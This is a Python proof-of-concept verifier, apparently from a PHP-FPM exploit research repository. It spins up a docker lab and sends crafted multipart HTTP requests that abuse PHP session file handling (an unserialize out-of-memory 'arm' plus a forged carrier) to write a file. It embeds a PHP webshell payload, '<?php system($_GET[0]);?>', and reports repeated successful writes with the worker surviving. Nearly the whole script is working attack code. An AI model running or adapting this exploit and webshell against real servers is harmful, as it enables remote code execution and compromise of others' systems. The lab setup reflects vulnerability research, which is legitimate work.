#!/usr/bin/env python3
"""Verify: the K-FREE (leak-free) ps_files->basedir file-write LANDS on fresh
php-fpm workers, fresh-container-per-trial, black-box, with the worker surviving.

Unlike the K-seated verify_ps_files_single_carrier_forge.py, NOTHING here reads the
2MB chunk base K (or any runtime address) to build the attack: the arm and the stage
are pure HTTP built only from the per-build constants in kfree_staletail_forge.BUILD_CONST.
K is harvested inside the worker from the stale high bytes of d->last (see that module).

Lab: reuses the existing `fpmps` profile (same pool.conf/html the K-seated
ps_files_single_carrier_forge verifier uses — checked byte-identical before reuse;
this primitive needs EXACT layout with no adaptability, but fpmps already matches):
    docker compose -f docker-compose.fpm-avenues.yml --profile fpmps up -d --build
    # nginx 127.0.0.1:18082
Run:
    python3 -I poc/primitives/write/verify_kfree_staletail_forge.py [ntrials] [--loud]

Each trial: fresh container -> arm (approved unserialize OOM, carries the DT path
backing in its un-parsed filler) -> stage the K-free carrier + webshell + file part
-> check the target file written AND the same worker PID still serves. PASS = all
trials wrote the file and survived. The attack uses NO observer/proc read. With
--loud, an observer read is added SOLELY to assert the arm produced the expected
d_choff and to FAIL LOUD (never silently skip) if the layout moved - the rigor rule
from fpm-blackbox-fresh-container-required.

Measured: 10/10 (loud) + 5/5 (pure, no observer) wrote /tmp/PWNED, worker PID stable.
K-free REQUIRES layout determinism (it cannot adapt to d_choff jitter like the
adaptive K-seated forge): hold the arm fixed; re-derive BUILD_CONST if it moves.
"""
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.write.kfree_staletail_forge import (  # noqa: E402
    BUILD_CONST, arm_parts, build_carrier, session_record, stage_parts)
from common.multipart import multipart_tuple  # noqa: E402

REPO = os.path.dirname(_POC_ROOT)
COMPOSE_FILE = os.path.join(REPO, "docker-compose.fpm-avenues.yml")
LAB = os.path.join(REPO, "lab", "fpmps")
BASE = "http://127.0.0.1:18082"
PROFILE = "fpmps"
CONTAINER = "p2s-fpmps-fpm"
SID = "sess0000000000000000000000000001"
SF = "/tmp/sess_" + SID
WEBSHELL = b"<?php system($_GET[0]);?>"
TARGET = "/tmp/PWNED"
CH = ~0x1fffff
BND = b"----l2"


def comp(*a, t=120):
    return subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "--profile", PROFILE, *a],
                          cwd=REPO, capture_output=True, text=True, timeout=t)


def dx(*c, t=30):
    return subprocess.run(["docker", "exec", CONTAINER, *c], capture_output=True, text=True, timeout=t).stdout


def http(path, data=None, ct=None, t=90, cookie=False):
    req = urllib.request.Request(BASE + path, data=data)
    if ct:
        req.add_header("Content-Type", ct)
    if cookie:
        req.add_header("Cookie", "PHPSESSID=" + SID)
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, repr(e).encode()


def wpid():
    s, b = http("/probe.php", t=8)
    return b.split(b":", 1)[1].decode().strip() if (s == 200 and b.startswith(b"ALIVE:")) else None


def ready():
    for _ in range(80):
        if wpid():
            return True
        time.sleep(0.5)
    return False


def d_choff_observed():
    for tok in dx("php", "/tmp/observer.php").split():
        if tok.startswith("unser.data="):
            return int(tok.split("=")[1], 16) & 0x1fffff
    return None


def trial(i, loud):
    comp("down", t=60)
    if comp("up", "-d", "--build").returncode != 0 or not ready():
        return f"trial {i}: SKIP (boot)"
    if loud:
        subprocess.run(["docker", "cp", os.path.join(LAB, "observer.php"), f"{CONTAINER}:/tmp/observer.php"],
                       capture_output=True)
    p0 = wpid()
    dx("sh", "-c", f"printf %s '{session_record().decode()}' > {SF}; chown www-data {SF}; rm -f {TARGET}")
    abody, ah = multipart_tuple(arm_parts(TARGET), BND)
    http("/arm.php", data=abody, ct=ah["Content-Type"])
    if loud:
        dch = d_choff_observed()
        if dch != BUILD_CONST["d_choff"]:   # FAIL LOUD, never skip
            return f"trial {i}: FAIL-LOUD d_choff=0x{dch:x} != 0x{BUILD_CONST['d_choff']:x}"
    carrier, _ = build_carrier(BUILD_CONST)
    sbody, sh = multipart_tuple(stage_parts(carrier, WEBSHELL), BND)
    http("/echo.php", data=sbody, ct=sh["Content-Type"], cookie=True)
    p1 = wpid()
    ls = dx("sh", "-c", f"ls {TARGET} 2>&1").strip()
    wrote = TARGET in ls and "No such" not in ls
    ok = wrote and p1 is not None and p1 == p0
    return f"trial {i}: p0={p0} p1={p1} wrote={wrote} -> {'PASS' if ok else 'FAIL'}"


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 and sys.argv[1].isdigit() else 5
    loud = "--loud" in sys.argv
    if subprocess.run(["docker", "version"], capture_output=True).returncode != 0:
        print("SKIP: docker unavailable"); return
    results = [trial(i, loud) for i in range(1, n + 1)]
    for r in results:
        print(r)
    comp("down", t=60)
    npass = sum("PASS" in r for r in results)
    print(f"\n{'PASS' if npass == n else 'FAIL'}: {npass}/{n} K-free wrote the file and survived"
          f"{' (loud d_choff check)' if loud else ' (pure, no observer)'}")


if __name__ == "__main__":
    main()
